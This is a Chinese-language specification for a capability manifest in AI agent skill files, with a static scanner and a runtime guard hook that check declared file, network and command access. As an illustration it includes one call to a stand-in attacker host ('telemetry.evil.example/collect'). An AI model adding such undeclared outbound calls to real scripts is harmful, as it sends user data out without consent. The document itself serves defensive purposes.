# 能力清单（Capability Manifest）规范 v0.1

> 三个消费方共享这份格式：**扫描器**做静态校验（声明了什么 vs 脚本实际引用什么）、**守卫**（guard，v0.2 起内置）在运行时按策略拦截、**人**在安装前一眼看清"这个 skill 到底能碰什么"。

## 1. 位置与语法

写在 SKILL.md frontmatter（YAML 子集）里，新增 `capabilities` 键：

```markdown
---
name: deploy-helper
description: 部署我的静态站
capabilities:
  fs:
    write: ["~/workspace/mysite/**", "/tmp/deploy/**"]
    read:  ["~/workspace/mysite/**"]
  net:
    domains: ["api.netlify.com", "*.netlify.com"]
  commands:
    allow: ["netlify", "git", "python3"]
---
```

只依赖 YAML 三个最基础的结构（标量 / 嵌套映射 / 列表项），不引入锚点、多行字符串等高级语法——skill 的 frontmatter 应该一屏读完。

## 2. 语义

| 键 | 含义 | 匹配规则 |
|---|---|---|
| `capabilities.fs.write` | 允许写入/修改的路径（glob） | `*` 不跨目录，`**` 跨目录；`~/` 展开为用户家目录 |
| `capabilities.fs.read` | 允许读取的路径（glob） | 同上 |
| `capabilities.net.domains` | 允许访问的域名 | 精确匹配；`*.example.com` 通配一级子域；声明 `example.com` 同时覆盖其子域 |
| `capabilities.commands.allow` | 允许执行的命令前缀 | 空格分隔的 argv 前缀；`git *` 表示 git 任意子命令 |

全部键可选。**没有 `capabilities` 键的 skill = 未声明能力**——扫描器不惩罚未声明（存量生态兼容），但安装者应当把它视为"能力未知"。

## 3. 刻意不做的事

- **不声明即拒绝**（deny-by-default）不是扫描器的行为——那是守卫 enforce 模式的职责，且需要用户显式开启，否则存量 skill 全部罢工
- 不做细粒度到参数值的权限（如"git push 但不能 push --force"）——frontmatter 解析器和匹配器都会膨胀，收益配不上复杂度
- 不发明新的传输格式：这份 frontmatter 就是全部，没有独立的 manifest 文件

## 4. 扫描器静态校验（本仓库 `skillarmor.py`）

| 规则 | 级别 | 触发 |
|---|---|---|
| `MANIFEST-undeclared-net` | medium | skill 自带脚本访问了 `net.domains` 未覆盖的域名（subdomain-aware） |
| `MANIFEST-parse` | low | `capabilities` 块存在但解析失败（键值写错、缩进异常） |

设计取向：**只查脚本、不查文档**。SKILL.md 正文里的 API 端点 URL 多是文档示例，跨查会淹没在误报里；自带脚本才是真正的执行面。

## 5. 运行时守卫（`scripts/skillarmor_guard.py`）

守卫是 PreToolUse hook：每次工具调用前拿到 `{tool_name, tool_input}`，按策略文件决定 放行/警告/拦截。策略文件与 manifest 是两回事：

- **manifest**（本文档）= skill 作者声明"我要什么"
- **guard 策略** = 用户机器上的全局底线（deny 列表 + 可选 allowlist + audit/enforce 模式），见 [`templates/guard-policy.example.json`](../templates/guard-policy.example.json)

MVP 的守卫**不做 per-skill 归因**（hook 载荷里没有"这次调用来自哪个 skill"的可靠信号），它执行的是机器级底线；per-skill 的声明 vs 使用对账由扫描器的静态校验完成。两者合起来覆盖"声明—校验—运行时底线"三环，归因留到 harness 提供 skill 来源信号之后。

## 6. 示例：声明与实际行为对齐

```markdown
---
name: weather-lookup
description: 查天气
capabilities:
  net:
    domains: ["wttr.in", "api.weather.gov"]
---
```

```bash
#!/usr/bin/env bash
# scripts/fetch.sh — 访问 wttr.in ✓ 已声明
curl -s "https://wttr.in/Beijing?format=3"
```

若脚本多了一行 `curl https://telemetry.evil.example/collect`，扫描器报
`MANIFEST-undeclared-net`（medium）——声明与行为的偏差第一次可见。
